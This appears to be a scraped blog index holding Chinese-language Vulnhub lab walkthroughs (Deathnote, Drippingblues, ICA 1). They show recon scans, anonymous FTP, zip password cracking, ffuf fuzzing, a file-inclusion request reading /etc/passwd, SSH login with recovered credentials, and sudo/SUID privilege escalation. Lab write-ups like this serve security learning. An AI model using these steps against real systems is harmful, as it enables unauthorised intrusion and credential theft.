┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ wpscan --url http://172.16.86.145 _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.25 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ Scan Aborted: The remote website is up, but does not seem to be running WordPress. ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ wpscan --url http://172.16.86.145/wordpress _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.25 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://172.16.86.145/wordpress/ [172.16.86.145] [+] Started: Thu Nov 9 01:33:59 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.38 (Debian) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://172.16.86.145/wordpress/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://172.16.86.145/wordpress/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://172.16.86.145/wordpress/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://172.16.86.145/wordpress/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.8 identified (Insecure, released on 2021-07-20). | Found By: Em","date":"2023-11-08","objectID":"/2023/11/vulnhub_deathnote/:4:0","tags":["Vulnhub"],"title":"Vulnhub Deathnote","uri":"/2023/11/vulnhub_deathnote/"},{"categories":["Web"],"content":"4. Privilege Escalation cat /etc/passwd没有再发现其他有价值的信息。但是在检查kria权限时发现kria具有管理员权限，我们直接sudo /bin/bash输入kria用户的密码就可以切换到root用户： kira@deathnote:/var$ sudo -l Matching Defaults entries for kira on deathnote: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User kira may run the following commands on deathnote: (ALL : ALL) ALL kira@deathnote:/var$ sudo /bin/bash [sudo] password for kira: root@deathnote:/var# 然后获取到root目录下的root.txt： ","date":"2023-11-08","objectID":"/2023/11/vulnhub_deathnote/:5:0","tags":["Vulnhub"],"title":"Vulnhub Deathnote","uri":"/2023/11/vulnhub_deathnote/"},{"categories":["Web"],"content":"Notes 没有注意到在访问默认页面时会解析到deathnote,vuln域名，所以也就没有配置host解析，导致从头到尾都没有太关注wen管理端页面。但是整体看下来，也没有影响到什么。 一个完整的过程可以看下here。 ","date":"2023-11-08","objectID":"/2023/11/vulnhub_deathnote/:6:0","tags":["Vulnhub"],"title":"Vulnhub Deathnote","uri":"/2023/11/vulnhub_deathnote/"},{"categories":["Web"],"content":"Vulnhub靶场记录--Drippingblues","date":"2023-11-08","objectID":"/2023/11/vulnhub_drippingblues/","tags":["Vulnhub"],"title":"Vulnhub Drippingblues","uri":"/2023/11/vulnhub_drippingblues/"},{"categories":["Web"],"content":"Vulnhub靶场练习 – Drippingblues ","date":"2023-11-08","objectID":"/2023/11/vulnhub_drippingblues/:0:0","tags":["Vulnhub"],"title":"Vulnhub Drippingblues","uri":"/2023/11/vulnhub_drippingblues/"},{"categories":["Web"],"content":"Knowledge robots.txt - spider dined fcrackzip - zip password crack ffuf - url parameters fuzz polkit - CVE-2021-4034 privilege escalation ","date":"2023-11-08","objectID":"/2023/11/vulnhub_drippingblues/:1:0","tags":["Vulnhub"],"title":"Vulnhub Drippingblues","uri":"/2023/11/vulnhub_drippingblues/"},{"categories":["Web"],"content":"1. Environment Setup 靶机下载链接：drippingblues 这个环境直接用VMware没有发现IP的问题，是一个Ubuntu 的desktop环境。 ","date":"2023-11-08","objectID":"/2023/11/vulnhub_drippingblues/:2:0","tags":["Vulnhub"],"title":"Vulnhub Drippingblues","uri":"/2023/11/vulnhub_drippingblues/"},{"categories":["Web"],"content":"2. Reconnaisence ","date":"2023-11-08","objectID":"/2023/11/vulnhub_drippingblues/:3:0","tags":["Vulnhub"],"title":"Vulnhub Drippingblues","uri":"/2023/11/vulnhub_drippingblues/"},{"categories":["Web"],"content":"1. IP Address arp-scan扫一下ip地址： ┌──(v4ler1an㉿kali)-[~/reports/http_172.16.86.144] └─$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: xxxxx, IPv4: 172.16.86.138 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 172.16.86.1 5e:52:30:c9:b7:65 (Unknown: locally administered) 172.16.86.2 00:50:56:fd:f8:ec VMware, Inc. 172.16.86.144 00:0c:29:cd:c8:dc VMware, Inc. 172.16.86.254 00:50:56:fe:01:5c VMware, Inc. 8 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 2.394 seconds (106.93 hosts/sec). 4 responded ","date":"2023-11-08","objectID":"/2023/11/vulnhub_drippingblues/:3:1","tags":["Vulnhub"],"title":"Vulnhub Drippingblues","uri":"/2023/11/vulnhub_drippingblues/"},{"categories":["Web"],"content":"2. Port Info nmap看下端口信息： ┌──(v4ler1an㉿kali)-[~/reports/http_172.16.86.144] └─$ nmap -T4 -A -Pn 172.16.86.144 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-08 21:01 EST Nmap scan report for 172.16.86.144 Host is up (0.0024s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:172.16.86.138 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rwxrwxrwx 1 0 0 471 Sep 19 2021 respectmydrip.zip [NSE: writeable] 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 9e:bb:af:6f:7d:a7:9d:65:a1:b1:a1:be:91:cd:04:28 (RSA) | 256 a3:d3:c0:b4:c5:f9:c0:6c:e5:47:64:fe:91:c5:cd:c0 (ECDSA) |_ 256 4c:84:da:5a:ff:04:b9:b5:5c:5a:be:21:b6:0e:45:73 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) | http-robots.txt: 2 disallowed entries |_/dripisreal.txt /etc/dripispowerful.html |_http-title: Site doesn't have a title (text/html; charset=UTF-8). Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.75 seconds 开放的端口信息： port service 21 FTP 22 SSH 80 HTTP Web 对于21端口，首先尝试一下匿名登录：anonymous/anonymous： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ ftp 172.16.86.144 Connected to 172.16.86.144. 220 (vsFTPd 3.0.3) Name (172.16.86.144:v4ler1an): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls 229 Entering Extended Passive Mode (|||49420|) 150 Here comes the directory listing. -rwxrwxrwx 1 0 0 471 Sep 19 2021 respectmydrip.zip 226 Directory send OK. ftp\u003e pwd Remote directory: / ftp\u003e get respectmydrip.zip local: respectmydrip.zip remote: respectmydrip.zip 229 Entering Extended Passive Mode (|||5400|) 150 Opening BINARY mode data connection for respectmydrip.zip (471 bytes). 100% |**************************************************************************************************************************************| 471 8.98 MiB/s 00:00 ETA 226 Transfer complete. 471 bytes received in 00:00 (629.22 KiB/s) ftp\u003e cd /homw 550 Failed to change directory. 把目录下的respectmydrip.zip下载下来，解压时发现需要密码，先暂时搁置。切换目录失败，看来只能拿到这个压缩包了。 同样的账号密码尝试SSH失败，也正常，ftp和ssh本来就是俩东西。 访问80端口的web服务： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ curl http://172.16.86.144 \u003chtml\u003e \u003cbody\u003e driftingblues is hacked again so it's now called drippingblues. :D hahaha \u003cbr\u003e by \u003cbr\u003e travisscott \u0026 thugger \u003c/body\u003e \u003c/html\u003e 页面提示已经被hack了，还留下了两个名字，这俩名字后面可能会有用，比如是ssh的登录用户，实战场景下也就是攻击者留下的后门账户。 ","date":"2023-11-08","objectID":"/2023/11/vulnhub_drippingblues/:3:2","tags":["Vulnhub"],"title":"Vulnhub Drippingblues","uri":"/2023/11/vulnhub_drippingblues/"},{"categories":["Web"],"content":"3. Web Directory 对80端口的web directory进行扫描： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ dirb http://172.16.86.144 -r ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Wed Nov 8 21:34:40 2023 URL_BASE: http://172.16.86.144/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt OPTION: Not Recursive ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://172.16.86.144/ ---- + http://172.16.86.144/index.php (CODE:200|SIZE:138) + http://172.16.86.144/robots.txt (CODE:200|SIZE:78) + http://172.16.86.144/server-status (CODE:403|SIZE:278) ----------------- END_TIME: Wed Nov 8 21:34:44 2023 DOWNLOADED: 4612 - FOUND: 3 发现一个robots.txt文件，访问： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ curl http://172.16.86.144/robots.txt User-agent: * Disallow: /dripisreal.txt Disallow: /etc/dripispowerful.html 访问下: ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ curl http://172.16.86.144/dripisreal.txt hello dear hacker wannabe, go for this lyrics: https://www.azlyrics.com/lyrics/youngthug/constantlyhating.html count the n words and put them side by side then md5sum it ie, hellohellohellohello \u003e\u003e md5sum hellohellohellohello it's the password of ssh ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ curl http://172.16.86.144/etc/dripispowerful.html \u003c!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"\u003e \u003chtml\u003e\u003chead\u003e \u003ctitle\u003e404 Not Found\u003c/title\u003e \u003c/head\u003e\u003cbody\u003e \u003ch1\u003eNot Found\u003c/h1\u003e \u003cp\u003eThe requested URL was not found on this server.\u003c/p\u003e \u003chr\u003e \u003caddress\u003eApache/2.4.41 (Ubuntu) Server at 172.16.86.144 Port 80\u003c/address\u003e \u003c/body\u003e\u003c/html\u003e 第一个文件提示我们去计算歌词的单词然后md5值作为ssh的登录密码，看起来不太现实，因为这个歌词很长，先暂时搁置；第二个文件访问不到，看来etc目录可能是操作系统的etc目录。 ","date":"2023-11-08","objectID":"/2023/11/vulnhub_drippingblues/:3:3","tags":["Vulnhub"],"title":"Vulnhub Drippingblues","uri":"/2023/11/vulnhub_drippingblues/"},{"categories":["Web"],"content":"3. Exploit 截止到目前为止，我们拿到的数据有一个respectmydrip.zip文件，但是带密码；另外有一个ssh密码的提示信息。 ","date":"2023-11-08","objectID":"/2023/11/vulnhub_drippingblues/:4:0","tags":["Vulnhub"],"title":"Vulnhub Drippingblues","uri":"/2023/11/vulnhub_drippingblues/"},{"categories":["Web"],"content":"1. Zip Crack 首先尝试破解respectmydrip.zip文件： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u respectmydrip.zip PASSWORD FOUND!!!!: pw == 072528035 ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ unzip respectmydrip.zip Archive: respectmydrip.zip [respectmydrip.zip] respectmydrip.txt password: extracting: respectmydrip.txt inflating: secret.zip ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ ll total 16 drwxr-xr-x 3 v4ler1an v4ler1an 4096 Nov 8 21:19 reports -rw-r--r-- 1 v4ler1an v4ler1an 20 Sep 19 2021 respectmydrip.txt -rw-r--r-- 1 v4ler1an v4ler1an 471 Sep 19 2021 respectmydrip.zip -rw-r--r-- 1 v4ler1an v4ler1an 171 Sep 19 2021 secret.zip 还真被我们爆破了这个压缩包。解压secret.zip提示还有密码，继续爆破尝试失败，密码也失败。查看respectmydrip.txt： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ cat cat respectmydrip.txt just focus on \"drip\" 看来是个提示。 ","date":"2023-11-08","objectID":"/2023/11/vulnhub_drippingblues/:4:1","tags":["Vulnhub"],"title":"Vulnhub Drippingblues","uri":"/2023/11/vulnhub_drippingblues/"},{"categories":["Web"],"content":"2. URL Parameters Fuzz 在前面的web directory的scan时，还有一个index.php的路径，我们可以尝试关注下这个文件。该文件处理的是web的主页面： 我们在前面的robot.txt中还有一个/etc/dripispowerful.html访问不到，那么可以尝试能不能通过index.php来看下这个文件。 对index.php进行一个get方法的parameters的fuzz看看能不能传递参数，如果包含一个文件包含漏洞，那么就可以访问/etc/dripispowerful.html文件了： ┌──(v4ler1an㉿kali)-[~/Documents/tools/scan/wfuzz] └─$ ffuf -ic -c -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://172.16.86.144/index.php?FUZZ=/etc/passwd' -fs 138 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://172.16.86.144/index.php?FUZZ=/etc/passwd :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 138 ________________________________________________ drip [Status: 200, Size: 3032, Words: 50, Lines: 58, Duration: 85ms] :: Progress: [220547/220547] :: Job [1/1] :: 1626 req/sec :: Duration: [0:02:49] :: Errors: 0 :: 成功发现drip参数，突然发现刚好是respectmydrip.txt文件中的提示信息。。。 使用drip参数访问一下/etc/dripispowerful.html文件： ┌──(v4ler1an㉿kali)-[~/Documents/tools/scan/wfuzz] └─$ curl http://172.16.86.144/index.php?drip=/etc/dripispowerful.html \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003cbody\u003e \u003cstyle\u003e body { background-image: url('drippin.jpg'); background-repeat: no-repeat; } @font-face { font-family: Segoe; src: url('segoeui.ttf'); } .mainfo { text-align: center; border: 1px solid #000000; font-family: 'Segoe'; padding: 5px; background-color: #ffffff; margin-top: 300px; } .emoji { width: 32px; } \u003c/style\u003e password is: imdrippinbiatch \u003c/body\u003e \u003c/html\u003e \u003chtml\u003e \u003cbody\u003e driftingblues is hacked again so it's now called drippingblues. :D hahaha \u003cbr\u003e by \u003cbr\u003e travisscott \u0026 thugger \u003c/body\u003e \u003c/html\u003e 其中有一个password，接下来就用这个password和之前的两个用户名去尝试ssh登录。 ","date":"2023-11-08","objectID":"/2023/11/vulnhub_drippingblues/:4:2","tags":["Vulnhub"],"title":"Vulnhub Drippingblues","uri":"/2023/11/vulnhub_drippingblues/"},{"categories":["Web"],"content":"4. Privilege Escalation ","date":"2023-11-08","objectID":"/2023/11/vulnhub_drippingblues/:5:0","tags":["Vulnhub"],"title":"Vulnhub Drippingblues","uri":"/2023/11/vulnhub_drippingblues/"},{"categories":["Web"],"content":"1. User Login 分别使用travisscott/imdrippinbiatch和thugger/imdrippinbiatch尝试登录ssh，发现第二个可以成功登录，并且可以读取到一个user.txt： ┌──(v4ler1an㉿kali)-[~/Documents/tools/scan/wfuzz] └─$ ssh thugger@172.16.86.144 thugger@172.16.86.144's password: Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.11.0-34-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 263 updates can be installed immediately. 30 of these updates are security updates. To see these additional updates run: apt list --upgradable New release '22.04.3 LTS' available. Run 'do-release-upgrade' to upgrade to it. Your Hardware Enablement Stack (HWE) is supported until April 2025. *** System restart required *** Last login: Wed Nov 8 17:05:31 2023 from 172.16.86.138 thugger@drippingblues:~$ ls Desktop Documents Downloads Music Pictures Public Templates Videos user.txt thugger@drippingblues:~$ id uid=1001(thugger) gid=1001(thugger) groups=1001(thugger) thugger@drippingblues:~$ ls Desktop Documents Downloads Music Pictures Public Templates Videos user.txt thugger@drippingblues:~$ cat user.txt 5C50FC503A2ABE93B4C5EE3425496521thugger@drippingblues:~$ 感觉是个md5，尝试去碰撞一下： ","date":"2023-11-08","objectID":"/2023/11/vulnhub_drippingblues/:5:1","tags":["Vulnhub"],"title":"Vulnhub Drippingblues","uri":"/2023/11/vulnhub_drippingblues/"},{"categories":["Web"],"content":"2. Privilege Escalation 接下来就是想办法去提权，内核版本比较高，而且环境中没有make、gcc等编译工具： thugger@drippingblues:~$ uname -a Linux drippingblues 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux thugger@drippingblues:~$ cat /proc/version Linux version 5.11.0-34-generic (buildd@lgw01-amd64-001) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 thugger@drippingblues:~$ gcc Command 'gcc' not found, but can be installed with: apt install gcc Please ask your administrator. thugger@drippingblues:~$ make Command 'make' not found, but can be installed with: apt install make # version 4.2.1-1.2, or apt install make-guile # version 4.2.1-1.2 Ask your administrator to install one of them. 但是发现了python3环境: thugger@drippingblues:~$ python3 Python 3.8.10 (default, May 26 2023, 14:05:08) [GCC 9.4.0] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. \u003e\u003e\u003e exit() 在寻找SUID程序时，发现了pkexec： thugger@drippingblues:~$ find / -perm -4000 -type f -exec ls -la {} 2\u003e/dev/null \\; -rwsr-xr-x 1 root root 72712 Kas 24 2022 /snap/core22/864/usr/bin/chfn -rwsr-xr-x 1 root root 44808 Kas 24 2022 /snap/core22/864/usr/bin/chsh -rwsr-xr-x 1 root root 72072 Kas 24 2022 /snap/core22/864/usr/bin/gpasswd -rwsr-xr-x 1 root root 47480 Şub 21 2022 /snap/core22/864/usr/bin/mount -rwsr-xr-x 1 root root 40496 Kas 24 2022 /snap/core22/864/usr/bin/newgrp -rwsr-xr-x 1 root root 59976 Kas 24 2022 /snap/core22/864/usr/bin/passwd -rwsr-xr-x 1 root root 55672 Şub 21 2022 /snap/core22/864/usr/bin/su -rwsr-xr-x 1 root root 232416 Nis 3 2023 /snap/core22/864/usr/bin/sudo -rwsr-xr-x 1 root root 35192 Şub 21 2022 /snap/core22/864/usr/bin/umount -rwsr-xr-- 1 root systemd-resolve 35112 Eki 25 2022 /snap/core22/864/usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 338536 Tem 19 22:41 /snap/core22/864/usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 111080 Ağu 10 2021 /snap/snapd/12883/usr/lib/snapd/snap-confine -rwsr-xr-x 1 root root 43088 Eyl 16 2020 /snap/core18/2796/bin/mount -rwsr-xr-x 1 root root 64424 Haz 28 2019 /snap/core18/2796/bin/ping -rwsr-xr-x 1 root root 44664 Kas 29 2022 /snap/core18/2796/bin/su -rwsr-xr-x 1 root root 26696 Eyl 16 2020 /snap/core18/2796/bin/umount -rwsr-xr-x 1 root root 76496 Kas 29 2022 /snap/core18/2796/usr/bin/chfn -rwsr-xr-x 1 root root 44528 Kas 29 2022 /snap/core18/2796/usr/bin/chsh -rwsr-xr-x 1 root root 75824 Kas 29 2022 /snap/core18/2796/usr/bin/gpasswd -rwsr-xr-x 1 root root 40344 Kas 29 2022 /snap/core18/2796/usr/bin/newgrp -rwsr-xr-x 1 root root 59640 Kas 29 2022 /snap/core18/2796/usr/bin/passwd -rwsr-xr-x 1 root root 149080 Nis 4 2023 /snap/core18/2796/usr/bin/sudo -rwsr-xr-- 1 root systemd-resolve 42992 Eki 25 2022 /snap/core18/2796/usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 436552 Mar 30 2022 /snap/core18/2796/usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 43088 Eyl 16 2020 /snap/core18/2128/bin/mount -rwsr-xr-x 1 root root 64424 Haz 28 2019 /snap/core18/2128/bin/ping -rwsr-xr-x 1 root root 44664 Mar 22 2019 /snap/core18/2128/bin/su -rwsr-xr-x 1 root root 26696 Eyl 16 2020 /snap/core18/2128/bin/umount -rwsr-xr-x 1 root root 76496 Mar 22 2019 /snap/core18/2128/usr/bin/chfn -rwsr-xr-x 1 root root 44528 Mar 22 2019 /snap/core18/2128/usr/bin/chsh -rwsr-xr-x 1 root root 75824 Mar 22 2019 /snap/core18/2128/usr/bin/gpasswd -rwsr-xr-x 1 root root 40344 Mar 22 2019 /snap/core18/2128/usr/bin/newgrp -rwsr-xr-x 1 root root 59640 Mar 22 2019 /snap/core18/2128/usr/bin/passwd -rwsr-xr-x 1 root root 149080 Oca 19 2021 /snap/core18/2128/usr/bin/sudo -rwsr-xr-- 1 root systemd-resolve 42992 Haz 11 2020 /snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 436552 Mar 4 2019 /snap/core18/2128/usr/lib/openssh/ssh-keysign -rwsr-xr-- 1 root dip 395144 Tem 23 2020 /usr/sbin/pppd -rwsr-xr-x 1 root root 31032 Şub 21 2022 /usr/bin/pkexec -rwsr-xr-x 1 root root 678","date":"2023-11-08","objectID":"/2023/11/vulnhub_drippingblues/:5:2","tags":["Vulnhub"],"title":"Vulnhub Drippingblues","uri":"/2023/11/vulnhub_drippingblues/"},{"categories":["Web"],"content":"Notes ","date":"2023-11-08","objectID":"/2023/11/vulnhub_drippingblues/:6:0","tags":["Vulnhub"],"title":"Vulnhub Drippingblues","uri":"/2023/11/vulnhub_drippingblues/"},{"categories":["Web"],"content":"思路梳理 url parameters fuzz –\u003e robots.txt get file info –\u003e get password –\u003e login ssh –\u003e polkit privilege escalation ","date":"2023-11-08","objectID":"/2023/11/vulnhub_drippingblues/:6:1","tags":["Vulnhub"],"title":"Vulnhub Drippingblues","uri":"/2023/11/vulnhub_drippingblues/"},{"categories":["Web"],"content":"CVE-2021-3560 CVE-2021-3560也是一个polkit常用的提权漏洞，但是在本次的测试中一直失败。 ","date":"2023-11-08","objectID":"/2023/11/vulnhub_drippingblues/:6:2","tags":["Vulnhub"],"title":"Vulnhub Drippingblues","uri":"/2023/11/vulnhub_drippingblues/"},{"categories":["Web"],"content":"Vulnhub靶场记录--ICA1","date":"2023-11-07","objectID":"/2023/11/vulnhub_ica/","tags":["Vulnhub"],"title":"Vulnhub ICA 1","uri":"/2023/11/vulnhub_ica/"},{"categories":["Web"],"content":"Vulnhub靶场练习 – ICA 1 Knowledge searchsploit - Exploit-DB vulnerabilities searching hydra - Brute froce username and password SUID - Privilege Escalation 1. Environment Setup 下载文件是ova格式，直接vmware运行即可,下载链接：https://download.vulnhub.com/ica/ica1.zip 如果出现配置了NAT但是靶机还是无法获取到IP的情况，并且类似arp-scan扫描不到IP，参考here。 2. Reconnaissance ","date":"2023-11-07","objectID":"/2023/11/vulnhub_ica/:0:0","tags":["Vulnhub"],"title":"Vulnhub ICA 1","uri":"/2023/11/vulnhub_ica/"},{"categories":["Web"],"content":"1. IP Address 常规地址扫描： ┌──(v4ler1an㉿kali)-[~] └─$ sudo arp-scan -l Interface: eth0, type: EN10MB, IPv4: 172.16.86.138 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 172.16.86.1 5e:52:30:c9:b7:65 (Unknown: locally administered) 172.16.86.2 00:50:56:fd:f8:ec (Unknown) 172.16.86.143 00:0c:29:5d:96:e6 (Unknown) --\u003e Target IP 172.16.86.254 00:50:56:e0:30:06 (Unknown) 8 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 2.221 seconds (115.26 hosts/sec). 4 responded ","date":"2023-11-07","objectID":"/2023/11/vulnhub_ica/:1:0","tags":["Vulnhub"],"title":"Vulnhub ICA 1","uri":"/2023/11/vulnhub_ica/"},{"categories":["Web"],"content":"2. Port Infomation 常规端口扫描： ┌──(v4ler1an㉿kali)-[~] └─$ nmap -T4 -A -Pn 172.16.86.143 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-08 02:17 EST Nmap scan report for 172.16.86.143 Host is up (0.0019s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 3072 0e:77:d9:cb:f8:05:41:b9:e4:45:71:c1:01:ac:da:93 (RSA) | 256 40:51:93:4b:f8:37:85:fd:a5:f4:d7:27:41:6c:a0:a5 (ECDSA) |_ 256 09:85:60:c5:35:c1:4d:83:76:93:fb:c7:f0:cd:7b:8e (ED25519) 80/tcp open http Apache httpd 2.4.48 ((Debian)) |_http-title: qdPM | Login |_http-server-header: Apache/2.4.48 (Debian) 3306/tcp open mysql MySQL 8.0.26 |_ssl-date: TLS randomness does not represent time | mysql-info: | Protocol: 10 | Version: 8.0.26 | Thread ID: 18 | Capabilities flags: 65535 | Some Capabilities: Speaks41ProtocolNew, Support41Auth, SupportsCompression, ConnectWithDatabase, LongPassword, Speaks41ProtocolOld, SupportsTransactions, InteractiveClient, LongColumnFlag, FoundRows, SwitchToSSLAfterHandshake, IgnoreSigpipes, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, ODBCClient, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults | Status: Autocommit | Salt: x~3 | %\\x01\\x0C\\x0Bk\\x06|Z\\x07%\\x1A\u003e\\x04ZA\\x18 |_ Auth Plugin Name: caching_sha2_password | ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate | Not valid before: 2021-09-25T10:47:29 |_Not valid after: 2031-09-23T10:47:29 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.07 seconds 开放了ssh的22端口、http web的80端口、mysql的3306端口。 ","date":"2023-11-07","objectID":"/2023/11/vulnhub_ica/:2:0","tags":["Vulnhub"],"title":"Vulnhub ICA 1","uri":"/2023/11/vulnhub_ica/"},{"categories":["Web"],"content":"3. Web Directory 访问http web的80端口： 是一个qdPM应用程序，登录使用邮箱和密码，版本为9.2。 Wappalyzer信息如下： 常规使用dirsearch扫一下web目录： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ dirsearch -u http://172.16.86.143 _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927 Output File: /home/v4ler1an/.dirsearch/reports/172.16.86.143/_23-11-08_02-23-56.txt Error Log: /home/v4ler1an/.dirsearch/logs/errors-23-11-08_02-23-56.log Target: http://172.16.86.143/ [02:23:56] Starting: [02:23:56] 301 - 311B - /js -\u003e http://172.16.86.143/js/ [02:23:57] 403 - 278B - /.ht_wsr.txt [02:23:57] 403 - 278B - /.htaccess.sample [02:23:57] 403 - 278B - /.htaccess.orig [02:23:57] 403 - 278B - /.htaccess.save [02:23:57] 403 - 278B - /.htaccess.bak1 [02:23:57] 403 - 278B - /.htaccess_extra [02:23:57] 403 - 278B - /.htaccess_orig [02:23:57] 403 - 278B - /.htaccessBAK [02:23:57] 403 - 278B - /.htaccessOLD2 [02:23:57] 403 - 278B - /.htaccessOLD [02:23:57] 403 - 278B - /.htaccess_sc [02:23:57] 403 - 278B - /.htm [02:23:57] 403 - 278B - /.html [02:23:57] 403 - 278B - /.httr-oauth [02:23:57] 403 - 278B - /.htpasswds [02:23:57] 403 - 278B - /.htpasswd_test [02:23:58] 403 - 278B - /.php [02:24:12] 301 - 316B - /backups -\u003e http://172.16.86.143/backups/ [02:24:12] 200 - 744B - /backups/ [02:24:14] 200 - 0B - /check.php 